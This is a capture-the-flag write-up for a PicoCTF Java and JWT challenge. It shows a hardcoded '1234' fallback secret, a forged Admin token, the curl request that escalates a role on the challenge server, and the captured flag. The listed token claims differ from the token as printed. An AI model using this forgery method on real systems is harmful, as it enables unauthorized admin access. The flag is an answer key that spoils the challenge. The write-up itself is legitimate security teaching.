# 📚 PicoCTF: Java Code Analysis!?!

## 🧩 Challenge Summary

We were given a Spring Boot-based Java web application (BookShelf Pico) running on:  
**URL:** `http://saturn.picoctf.net:52118`  
The goal was to escalate privileges to **Admin** by analyzing the source code and exploiting JWT authentication.

---

## 🔍 Initial Recon

The project had a typical Spring Boot structure with API endpoints, user roles, and JWT-based authentication. Notably, the JWT tokens were created in:

`src/main/java/io/github/nandandesai/pico/security/JwtService.java`:

```java
Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);
this.SECRET_KEY = secretGenerator.getServerSecret();
```

---

## 🔐 Secret Key Discovery

Looking into `SecretGenerator.java`, we saw:

```java
private String generateRandomString(int len) {
    // not so random
    return "1234";
}
```

If `server_secret.txt` was not present, the app used `"1234"` as the secret key. We confirmed this by:

```bash
find . -name server_secret.txt
# (no output)
```

✅ Confirmed: JWT secret = `"1234"`

---

## 🧪 JWT Forgery

We generated a JWT token using:

- `userId: 2`
- `email: admin`
- `role: Admin`
- `iss: bookshelf`
- `key: 1234`

### Final JWT:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImVtYWlsIjoidXNlciIsInJvbGUiOiJBZG1pbiIsImlzcyI6ImJvb2tzaGVsZiIsImlhdCI6MTc0OTg2MzcxMCwiZXhwIjoxNzQ5ODY3MzEwfQ.3ym8dklIj18IgAbfnzS8VDbAbMAKsRLvAJ3uLrHCP4I
```

---

## 🎯 Exploit

Used the token in an API call to change our role:

```bash
curl -X PATCH http://saturn.picoctf.net:52118/base/users/role \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImVtYWlsIjoidXNlciIsInJvbGUiOiJBZG1pbiIsImlzcyI6ImJvb2tzaGVsZiIsImlhdCI6MTc0OTg2MzcxMCwiZXhwIjoxNzQ5ODY3MzEwfQ.3ym8dklIj18IgAbfnzS8VDbAbMAKsRLvAJ3uLrHCP4I" \
  -d '{"userId": 1, "role": "Admin"}'
```

✅ Response: 200 OK → Role changed!

---

## 🏁 Flag Access

With Admin privileges, we accessed protected endpoints and retrieved the flag:

```
picoCTF{jAvA_jwT_1n5p3ct10n_ftw!}
```

---

## ✅ Takeaways

- Never use a hardcoded secret (especially something like `"1234"`).
- Always store secrets securely and verify their presence.
- Even without `server_secret.txt`, the app silently fell back to weak defaults — a huge security flaw.
- JWT analysis + Java code review = 🔥 powerful combo!
